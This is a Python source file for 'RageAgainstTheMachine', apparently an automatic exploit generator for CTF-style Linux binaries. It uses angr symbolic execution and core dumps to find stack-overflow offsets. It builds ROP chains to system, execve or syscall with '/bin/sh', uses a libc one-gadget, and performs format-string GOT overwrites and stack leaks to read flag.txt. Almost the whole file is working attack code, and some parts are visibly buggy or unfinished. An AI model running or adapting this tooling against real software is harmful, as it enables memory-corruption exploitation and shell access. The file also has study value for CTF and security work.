import angr, claripy
import os, subprocess
import logging
import argparse
import ropgadget
import r2pipe

from pwn import *
from binascii import *

# Disable angr logging and pwntools until we need it 
logging.getLogger("angr").setLevel(logging.CRITICAL)
#logging.getLogger("angr").setLevel(logging.DEBUG)
logging.getLogger("os").setLevel(logging.CRITICAL)
logging.getLogger("pwnlib").setLevel(logging.CRITICAL)



# Create a logger object
logger = logging.getLogger("RageAgainstTheMachine")

# Set the log level
logger.setLevel(logging.INFO)
# Create a formatter
formatter = logging.Formatter('%(name)s - [%(levelname)s]: %(message)s')

# Create a console handler and set its formatter and log level
ch = logging.StreamHandler()
ch.setFormatter(formatter)
ch.setLevel(logging.DEBUG)

# Add the console handler to the logger
logger.addHandler(ch)




context.update(
    arch="amd64",
    endian="little",
    log_level="warning",
    os="linux",
    #terminal=["tmux", "split-window", "-h", "-p 65"]
    terminal=["st"]
)

# Important lists to use such as useful strings, the functions we want to call in our rop chain, the calling convention, and useful rop functions with gadgets
strings =  ["/bin/sh", "/bin/cat flag.txt", "cat flag.txt", "flag.txt"]
exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
useful_rop_functions = ["__libc_csu_init"]


class rAEG:
    # Initialize class variables that are important here
    def __init__(self, binary_path, libc_path):
        self.binary = binary_path
        self.libc_path = libc_path
        self.elf = context.binary = ELF(binary_path)
        self.libc = context.binary = ELF(libc_path)

        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
        self.cfg = self.proj.analyses.CFGFast()

        self.exploit_function = None

        self.rop_chain = None
        self.chain_length = 0
        self.string_address = None

        self.symbolic_padding = None

        self.libc_offset_string = ""
        self.canary_offset_string = ""
        self.format_string = ""

        self.has_leak = False
        self.has_overflow = False
        self.has_libc_leak = False


        self.flag = None

    # Determine which exploit we need and return which type as a string
    # Also determine the parameters needed, and the function to execute
    def find_vulnerability(self):
        self.angry_analyze()
        self.core_smash()

        if self.has_leak:
            logger.info(f"Found a format string vulnerability")

            symbols = []
            if "pwnme" in self.elf.sym.keys():
                logger.info("Found a format overwrite with the pwnme variable")
                self.exploit_function = "pwnme"
                ret = self.format_write(1337, self.elf.sym['pwnme'], 'pwnme')
                if ret == 1:
                    None
                else:
                    for i in self.elf.got.keys():
                        try:
                            ret = self.format_write(self.elf.sym['win'], self.elf.got[i], 'fmtstr')
                            if ret == 1:
                                break
                        except:
                            ret = 0
            elif "win" in self.elf.sym.keys() and "pwnme" not in self.elf.sym.keys():
                logger.info("Found a win function with a format got overwrite")

                self.exploit_function = "win"
                for i in self.elf.got.keys():
                    try:
                        ret = self.format_write(self.elf.sym['win'], self.elf.got[i], 'fmtstr')
                        if ret == 1:
                            break
                    except KeyError:
                        ret = 0
            else:
                self.format_leak()
                if "fopen" in self.elf.sym.keys():
                    logger.info("Found a format read")
                else:
                    logger.info("Found a libc leak")
                    self.generate_rop_chain()

        else:
            p = process(self.binary)
            prompt = p.recvline()

            if b"0x" in prompt:
                self.has_libc_leak = True

            for s in strings:
                output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
                string_output = output.split(b"\n")[2].split(b" ")
                if len(string_output) > 1:
                    self.string_address = p64(int(string_output[0],16))
                    logger.info(f"Found string {s} at {hex(u64(self.string_address))}")
                    break

            if self.string_address == None:
                logger.warning("Couldn't find any useful strings")

            params = []
            # Find functions to use for exploit by enumerating through one win exploit functions
            #for symb in self.elf.sym.keys:
            if "win" in self.elf.sym.keys():
                self.exploit_function = "win"
                goal = self.find_goal("win")
                if goal != None:
                    self.exploit_function = goal
                logger.info("Found win function")
            elif "system" in self.elf.sym.keys():
                self.exploit_function = "system"
                logger.info("Found system function")
                params = [self.string_address, p64(0)]
            elif "execve" in self.elf.sym.keys():
                self.exploit_function = "execve"
                params = [self.string_address, p64(0), p64(0)]
                logger.info("Found execve function")
            elif "syscall" in self.elf.sym.keys():
                self.exploit_function = "syscall"
                logger.info("Found syscall function")
                params = [self.string_address, p64(0), p64(0)]
            elif "print_file" in self.elf.sym.keys():
                self.exploit_function = "print_file"
                logger.info("Found print_file function")
                params = [self.string_address]
            elif "puts" in self.elf.sym.keys():
                self.exploit_function = "puts"
                logger.info("Found puts function")

            # Set functions and parameters as a dictionary set

            self.parameters = params
            self.generate_rop_chain()

    # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
    def check_mem_corruption(self, simgr):
        if simgr.unconstrained:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                    try:
                        index = stack_smash.index(b"AAAAAAAA")
                        self.symbolic_padding = stack_smash[:index]
                        logger.info(f"Found symbolic padding: {self.symbolic_padding}")
                        logger.info(f"Successfully Smashed the Stack, Takes {len(self.symbolic_padding)} bytes to smash the instruction pointer")
                        simgr.stashes["mem_corrupt"].append(path)
                    except ValueError:
                        logger.warning("Could not find index of pc overwrite")
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")

        return simgr

    # Use angr to explore with the check_mem_corruption function
    def angry_analyze(self):
        # Create angr project
        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
        self.cfg = self.proj.analyses.CFGFast()
        self.fun_mgr = self.cfg.kb.functions

        # Maybe change to symbolic file stream
        buff_size = 600
        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
        self.symbolic_padding = None

        self.state = self.proj.factory.blank_state(
                addr=self.elf.sym["main"],
                stdin=self.symbolic_input,
                add_options = angr.options.unicorn
        )
        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
        self.simgr.stashes["mem_corrupt"] = []
        self.simgr.stashes["format_strings"] = []

        # This is the address after the last printf is called which is where we want to check the got table
        # to see which functions are unfilled
        self.last_printf_address = None


        # Check to see if printf is a format string vulnerability
        # If it is record the address to create a state to smash the stack
        def analyze_printf(state):
            # Check if rsi is not a string
            # If it isn't then we know the vulnerable printf statement
            string = state.solver.eval(state.regs.rdi)
            varg = state.solver.eval(state.regs.rsi)
            address = state.solver.eval(state.regs.rip)

            return_target = state.callstack.current_return_target

            #print(return_target)

            # If rdi is a stack or libc address
            if string >= 0xffffffffff:
                self.has_leak = True

        def analyze_input(state):
            size = state.solver.eval(state.regs.rsi)
            if size >= 1000:
                self.simgr.drop(stash = "active")

        def debug_read(state):
            print(f"mem_read at {state}")
            print(f"Mem read length {state.inspect.mem_read_expr}")

        #self.state.inspect.b("mem_read", when=angr.BP_AFTER, action=debug_read)

        self.proj.hook_symbol("fgets", analyze_input)
        self.proj.hook_symbol("printf", analyze_printf)

        logger.info("Symbolically analyzing the binary")
        #try:
        self.simgr.explore(step_func=self.check_mem_corruption)
        #except ValueError:
            #logger.warning(f"Simulation unsatisfiable")
            #self.has_leak = True


        for e in self.simgr.errored:
            logger.warning(f"Simulation errored with {error}")
            #print(e.error)
            if e.error == "Symbolic (format) string, game over :(":
                logger.info("Found symbolic format string vulnerability")
                self.has_leak = True

        if len(self.simgr.stashes["mem_corrupt"]) <= 0:
            logger.warning("Failed to smash stack")
        else:
            self.has_overflow = True


    # Dynamically get the offset
    def core_smash(self):
        p = process(self.binary)
        while p.poll() == None:
            if p.can_recv(timeout=1):
                try:
                    p.recv()
                except EOFError:
                    continue
            else:
                p.sendline(cyclic(3000,n=8))
                p.wait()
                try:
                    core = p.corefile
                except:
                    continue
                p.close()
                p.kill()
                if core == None:
                    continue
                os.remove(core.file.name)
                if(core.stack.data[-8:] != b'\x00'*8):
                    self.core_smash()
                    continue
                padding = cyclic_find(core.read(core.rsp, 8),n=8)
                if padding == -0x1:
                    padding = cyclic_find(core.read(core.rbp, 8),n=8)
                    if padding == -0x1:
                        continue
                    else:
                        padding += 8
                self.padding = padding


    def find_goal(self, function_name):

        arguments = []
        function = self.fun_mgr[self.elf.sym[function_name]]

        calls = function.get_call_sites()
        goal_addr = None
        end = None

        for b in function.block_addrs:
            end = b

        for call in calls:
            target = function.get_call_target(call)
            if self.fun_mgr[target].name == "system":
               goal_addr = call

        if goal_addr != None:
            return goal_addr
        else:
            return None

    # Find pop gadgets to control register
    def find_pop_reg_gadget(self, register):
        # Filters out only pop instructions 
        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"{register}", "--only", "pop|ret"]).split(b"\n")
        output.pop(0)
        output.pop(0)
        output.pop(-1)
        output.pop(-1)
        output.pop(-1)


        if len(output) <= 0:
            logger.info(f"Couldn't find gadget for {register}")
            return None
        # Iterate through gadgets to find the one with the least instructions
        # This will make sure that the gadget that we want is always first
        min_gadget = output[0]
        min_instructions = output[0].count(b";") + 1
        for gadget in output:
            instructions = gadget.count(b";") + 1
            nops = gadget.count(b"nop")
            instructions -= nops
            if instructions <= min_instructions:
                min_instructions = instructions
                min_gadget = gadget

        logger.info(f"Found gadget for {register}: {min_gadget}")
        return min_gadget



    # Find gadget to write to writable address in memory
    def find_write_gadget(self):
        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", "mov .word ptr \[.*\], *.", "--filter", "jmp"]).split(b"\n")
        output.pop(0)
        output.pop(0)
        output.pop(-1)
        output.pop(-1)
        output.pop(-1)

        # First get check to make sure that the same register isn't being dereferenced
        # Add all gadgets that are valid to a list
        # Optimal gadgets will have both registers using 64 bit for the mov write primitive
        # Valid gadgets will be one where the two registers are different
        valid_gadgets = []
        optimal_gadgets = []
        for gadget in output:
            instructions = gadget.split(b";")
            for instruction in instructions:
                if b"ptr" in instruction:
                    reg1 = instruction.split(b"[")[1].split(b",")[0].strip(b"]").strip()
                    reg2 = instruction.split(b"[")[1].split(b",")[1].strip(b"]").strip()
                    if reg1[1:] != reg2[1:]:
                        valid_gadgets.append(gadget)
                        if chr(reg1[0]) == "r":
                            if chr(reg2[0]) == "r":
                                optimal_gadgets.append(gadget)


        # If there are no optimal gadgets choose from valid ones
        if len(optimal_gadgets) <= 0:
            if len(valid_gadgets) <= 0:
                logger.warning("Couldn't find write gadget")
                return None
            optimal_gadgets = valid_gadgets

        # Find the gadget with the lowest amount of instructions
        min_gadget = optimal_gadgets[0]
        min_instructions = optimal_gadgets[0].count(b";") + 1
        for gadget in optimal_gadgets:
           instructions = gadget.count(b";") + 1
           if instructions < min_instructions:
               min_instructions = instructions
               min_gadget = gadget

        logger.info(f"Found write primitive gadget: {min_gadget}")

        reg1 = min_gadget.split(b"[")[1].split(b",")[0].split(b"]")[0].strip()
        reg2 = min_gadget.split(b"[")[1].split(b",")[1].split(b"]")[0].split(b";")[0].strip()
        return min_gadget, reg1, reg2


    # Write string to writable address in the binary
    # !TODO Change to be able to write different strings
    def rop_chain_write_string(self):
        chain = b""

        write = self.find_write_gadget()
        gadget1 = self.find_pop_reg_gadget(write[1].decode())
        gadget2 = self.find_pop_reg_gadget(write[2].decode())
        # Get writable address (for now just the start of the data section)
        addr = self.elf.get_section_by_name(".data").header.sh_addr
        
        pops = gadget1.split(b":")[1].strip().count(b"pop") - 1
        chain += p64(int(gadget1.split(b":")[0].strip(), 16)) + p64(addr)
        while pops > 0:
            pops -= 1
            chain += p64(0)
        
        pops = gadget2.split(b":")[1].strip().count(b"pop") - 1
        chain += p64(int(gadget2.split(b":")[0].strip(), 16)) + b"/bin/sh\x00"
        while pops > 0:
            pops -= 1
            chain += p64(0)
        
        pops = write[0].count(b"pop")
        chain += p64(int(write[0].split(b":")[0].strip(), 16))
        while pops > 0:
            pops -= 1
            chain += p64(0)

        return chain



    # Create a rop chain to execute a function call
    def rop_chain_call_function(self, function, parameters):

        chain = b""
        # If there are any parameters to add to the rop chain then they go in here
        if len(parameters) > 0:
            # If it is a syscall add pop rax, ret and 59 for execve
            if function == "syscall":
                pop_rax_string= self.find_pop_reg_gadget("rax")
                instructions = pop_rax_string.split(b";")
                pop_rax = p64(int(pop_rax_string.split(b":")[0].strip(),16))
                chain += pop_rax + p64(59)

                for instruction in instructions[1:]:
                    if b"ret" in instruction:
                        break
                    param = p64(0)
                    for i in range(len(parameters)):
                        if arg_regs[i] in instruction:
                            param = parameters[i]
                    chain += param

            # Reversed in order as the more important parameters go in last
            #for i in range(len(parameters)-1, -1, -1):
            for i in range(len(parameters)):
                pop_reg_string = self.find_pop_reg_gadget(arg_regs[i].decode())
                if pop_reg_string == None:
                    continue
                instructions = pop_reg_string.split(b";")
                pop_reg = p64(int(pop_reg_string.split(b":")[0].strip(),16))
                chain += pop_reg
                #print(parameters)
                chain += parameters[i]
                for instruction in instructions[1:]:
                    if b"ret" in instruction:
                        break
                    param = p64(0)
                    for i in range(len(parameters)):
                        if arg_regs[i] in instruction:
                            #print(arg_regs[i])
                            param = parameters[i]
                            break;
                        if b"rax" in instruction:
                            param = p64(59)
                    chain += param

        # To avoid movaps error for all chains put an extra ret to make the chain divisible by 16
        if (len(chain) + self.chain_length + 8) % 16 != 0:
            chain += p64(self.elf.sym["_fini"])
        if function == "syscall":
            output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--only", "syscall"]).split(b"\n")
            output.pop(0)
            output.pop(0)
            output.pop(-1)
            output.pop(-1)
            output.pop(-1)


            syscall_gadget = int(output[0].split(b":")[0].strip(),16)

            chain += p64(syscall_gadget)
        else:
            if type(function) == int:
                print(hex(function))
                chain += p64(function)
            else:
                chain += p64(self.elf.sym[function])
        logger.info(f"Generated ROP chain for {function} with {len(parameters)} parameters")

        return chain


    def rop_libc(self):

        p = process(self.binary)

        r = ROP(self.elf)
        gs = '''
            init-pwndbg
        '''

        #p = gdb.debug(self.binary,gdbscript=gs)

        f = open("./format.txt", "w+")
        f.write(self.libc_offset_string + "\n")
        f.close()

        self.resolve_libc_offset()

        addr = self.elf.get_section_by_name(".data").header.sh_addr

        prompt = p.recvline()

        print(hex(self.libc.sym["system"]))

        if b"0x" in prompt:
            self.leak = int(prompt.split(b":")[1].strip(b"\n"),16)
            logger.info(f"Libc address leaked {hex(self.leak)}")
            self.libc.address = self.leak + self.libc_offset
            logger.info(f"Found libc base address {hex(self.libc.address)}")

        else:
            if self.libc_offset_string != None:
                p.sendline(bytes(self.libc_offset_string, "utf-8"))
                p.recvuntil(b"0x")
                self.leak = int(p.recvline().strip(b"\n"),16)
                logger.info(f"Libc address leaked {hex(self.leak)}")
                self.libc.address = self.leak + self.libc_offset

                logger.info(f"Found libc base address {hex(self.libc.address)}")


        pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0] + self.libc.address)
        pop_rsi = p64(r.find_gadget(["pop rsi", "pop r15", "ret"])[0] + self.libc.address)
        bin_sh = p64(next(self.libc.search(b"/bin/sh\x00")))
        #logger.info(f"Found pop rdi gadget in libc {hex(u64(pop_rdi))}")
        #logger.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")


        # If there is no symbolic padding then using core dump
        if self.symbolic_padding == None:
            chain = b"A" * self.padding
        else:
            # Prefer to use symbolic padding if it is the same as the core dump
            if len(self.symbolic_padding) == self.padding:
                chain = self.symbolic_padding
            # If it is not the same then use the core dump
            else:
                chain = b"A" * self.padding

        chain += p64(self.libc.address + 0x4f302)
        chain += p64(0) * 100

        #chain += pop_rdi + bin_sh
        #chain += pop_rsi + p64(0) + p64(0)
        #chain += p64(self.elf.sym["_fini"])
        #chain += p64(self.libc.sym["system"])
        #chain += p64(0)

        p.sendline(chain)
        p.sendline(b"cat flag.txt")
        try:
            output = p.recvall(timeout=2)
            print(output)
            if b"flag" in output:
                self.flag = b"flag{" + output.split(b"{")[1].replace(b" ", b"").replace(b"\n", b"").split(b"}")[0] + b"}"
                self.flag = self.flag.decode()
        except:
            logger.info("ROP chain exploit failed")



    def generate_rop_chain(self):

        if self.string_address == None:
            #Perform a w16te primitive
            if self.has_libc_leak == True:
                self.rop_chain = self.rop_libc()
            else:
                self.rop_chain = self.rop_chain_write_string()
                self.chain_length += len(self.rop_chain)
                self.string_address = p64(self.elf.get_section_by_name(".data").header.sh_addr)
                self.parameters[0] = self.string_address
                self.rop_chain += self.rop_chain_call_function(self.exploit_function, self.parameters)
        else:
            self.rop_chain =  self.rop_chain_call_function(self.exploit_function, self.parameters)


    def format_leak(self):

        control = 0
        start_end = [0,0]
        stack_len = 100
        string = ""

        # Run the process for stack_len amount of times to leak the entire stack
        for  i in range(1, stack_len):

            if control == 1:
                logging.info(self.flag)
                break

            p = process(self.binary)
            offset_str = "%" + str(i) + "$p."
            p.sendline(bytes(offset_str, "utf-8"))
            p.recvuntil(b">>>")

            try:
                p.recvuntil(b": ")
                response = p.recvline().strip().split(b".")


                if response[0].decode() != "(nil)":
                    address = response[0].decode()
                    response = response[0].strip(b"0x")
                    # Find a the valid canary on the stack
                    canary = re.search(r"0x[a-f0-9]{14}00", address)
                    if canary and self.elf.canary:
                        self.canary_offset_string = offset_str
                        logger.info(f"Found canary leak at offset {i}:{address}")

                    libc_leak = re.search(r"0x7f[^f][a-f0-9]+34a", address)
                    if libc_leak:
                        self.libc_offset_string = offset_str.split(".")[0]
                        self.has_libc_leak = True
                        logger.info(f"Found libc leak at offset {i}:{hex(address)}")

                    try:
                        flag = unhexlify(response)[::-1]
                        if "flag" in flag.decode() and start_end[0] == 0:
                            string += flag.decode()
                            start_end[0] = 1
                        elif start_end[0] == 1 and "}" in flag.decode():
                            string += flag.decode()
                            self.flag = string
                        elif start_end[0] == 1 and "}" not in flag.decode():
                            string += flag.decode()
                        elif "}" in flag.decode() and start_end[1] == 0:
                            string += flag.decode()
                            self.flag  = string
                            control = 1
                    except:
                        p.close()
                p.close()
            except:
                p.close()

            p.close()




    #Accepts:
    #value (e.sym[] or int value to write)
    #addr (e.sym[] or e.got[] address to write to)
    def format_write(self, value, addr, exp_type):
        offset = 0
        #Find response from self.binary
        for i in range(1, 100):
            p = process(self.binary)
            probe = 'AAAAAAAZ%' + str(i) + '$p'
            p.sendline(bytes(probe,"utf-8"))
            data = p.recvall().decode().strip('\n').split('Z')
            if data[1] == '0x5a41414141414141':
                offset = i
                p.close()
                break
            p.close()


        #Find Spaces written for offset
        spaces_written = 0
        test_str = '%' + str(value) + 'd%1$n'

        #Add spaces to test strings to calculate offset
        if (len(test_str) % 8) != 0:
            for i in range(8):
                if (len(test_str) % 8) != 0:
                    test_str += ' '
                    spaces_written += 1
                else:
                    break

        #Offset calculated with test_string
        offset += int(len(test_str) / 8)

        #Build beginning portion of FmtStr
        format_string = '%' + str(value) + 'd%' + str(offset) + '$n'

        #Check for alignment
        if (len(format_string) % 8) != 0:
            for i in range(8):
                if (len(format_string) % 8) != 0:
                    format_string += ' '
                else:
                    break

        #Convert to bytes and add vulnerable address in GOT
        self.format_string = bytes(format_string, 'utf-8') + p64(addr)


        #Send exploit
        p = process(self.binary)
        p.sendline(self.format_string)

        if exp_type == 'pwnme':
            try:
                data = p.recvall(timeout=8)
                if b"flag" in data:
                    self.flag = b"flag{" + data.split(b"{")[1].replace(b" ", b"").replace(b"\n", b"").split(b"}")[0] + b"}"
                    self.flag = self.flag.decode()
                    p.close()
                    logger.info("First Controllable Offset Located at: " + str(offset))
                    logger.info(f"Sending Format String: {self.format_string}")
                    return 1
            except:
                return 0

        else:
            p.sendline(b'cat flag.txt')
            #Tries to recv all until timeout
            try:
                data = p.recvall(timeout=8)
                if b'flag' in data:
                    self.flag = b"flag{" + data.replace(b" ", b"").replace(b"\n", b"").split(b"{")[1].split(b"}")[0] + b"}"
                    self.flag = self.flag.decode()
                    p.close()
                    logger.info("First Controllable Offset Located at: " + str(offset))
                    logger.info(f"Sending Format String: {self.format_string}")
                    return 1
            except:
                log.warning("Receive Failed...")
                return 0



    # Function to resolve the libc base offset from the leak
    def resolve_libc_offset(self):

        self.r2 = r2pipe.open(self.binary, flags=["-2", "-d", "rarun2", f"program={self.binary}", f"stdin=./format.txt"])


        # Random r2pipe commands that gets the memory map of the libc base and runs the program for the leak
        # For some reason r2pipe will mess up the order of the commands or skip a command output when returning
        # So just adding a bunch of random commands seems to work
        self.r2.cmd("aa")
        self.r2.cmd("e scr.color=0")
        # Break on main
        self.r2.cmd("dcu main")
        command_buffer = []
        command_buffer.append(self.r2.cmd("dc"))
        command_buffer.append(self.r2.cmd("dc"))
        # Get libc base while running
        # Have to append to a command buffer because the output of the command is not always aligned
        command_buffer.append(self.r2.cmd("dm | grep libc.so -m 1"))
        command_buffer.append(self.r2.cmd("dc"))
        command_buffer.append(self.r2.cmd("dc"))
        command_buffer.append(self.r2.cmd("aa"))
        command_buffer.append(self.r2.cmd("aa"))

        for command in command_buffer:
            if "libc" in command:
                libc_base_debug = command
            if "Leak" in command:
                debug_output = command
        debug_lines = debug_output.split("\n")

        for line in debug_lines:
            if "Leak" in line:
               debug_output = line

        for line in debug_lines:
            if "Leak" in line:
                debug_output = line


        #print(f"Leak: {debug_output}")
        #print(f"Base: {libc_base_debug}")


        debug_ouput = debug_output.split("Leak")

        leak_address = re.findall(r" 0x7f[A-Fa-f0-9]+", debug_output)
        #print("\n\n")
        #print(f"Leak: {leak_address}")
        leak_address = leak_address[-1]
        libc_base_address = re.search(r"0x[0]+7f[A-Fa-f0-9]+", libc_base_debug)

        leak_address = int(leak_address, 16)
        #print(f"Base: {libc_base_address}")

        if libc_base_address:
            libc_base_address = int(libc_base_address.group(),16)

        self.libc_offset = libc_base_address - leak_address

        logger.info(f"Found libc offset {self.libc_offset}")


    def start_process(self):

        gs = """
            init-pwndbg
        """
        if args.GDB:
            return gdb.debug(self.binary, gdbscript=gs)
        else:
            return process(self.binary)

    
    def exploit(self):
        p = self.start_process()


        if self.rop_chain != None:
            if self.symbolic_padding != None:
                if len(self.symbolic_padding) == self.padding:
                    logger.info("Sending ROP Chain with symbolic padding")
                    p.sendline(self.symbolic_padding + self.rop_chain)
                else:
                    logger.info(f"Sending ROP Chain with {self.padding} padding")
                    p.sendline(b"A" * self.padding + self.rop_chain)
            else:
                logger.info(f"Sending ROP Chain with {self.padding} padding")
                p.sendline(b"A" * self.padding + self.rop_chain)


            p.sendline(b"cat flag.txt")
            p.sendline(b"cat flag.txt")
            try:
                output = p.recvall(timeout=2).decode()
                self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
                print(self.flag)
            except:
                logger.info("ROP chain exploit failed")


        # Assume that its a format challenge either format write or format leak
        else:
            # Insert leak stack function here
            if self.flag != None:
                print(self.flag)
            # If there is a buffer overflow and no symbolic padding









if __name__ == "__main__":

    print("""
 ██▀███   ▄▄▄        ▄████ ▓█████
▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▓█   ▀
▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒███
▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄
░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░
  ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░  ░ ░  ░
  ░░   ░   ░   ▒   ░ ░   ░    ░
   ░           ░  ░      ░    ░  ░
    """)


    parser = argparse.ArgumentParser(
        prog = "RageAgainstTheMachine",
        description = "An automatic exploit generator using angr, ROPgadget, and pwntools",
        epilog = "Created by Stephen Brustowicz, Alex Schmith, Chandler Hake, and Matthew Brown"
    )

    #parser.add_argument("bin",  help="path of the binary to exploit")
    
    arguments = parser.parse_args()
    rage = rAEG(args.BIN, "/opt/libc.so.6")

    rage.find_vulnerability()

    rage.exploit()
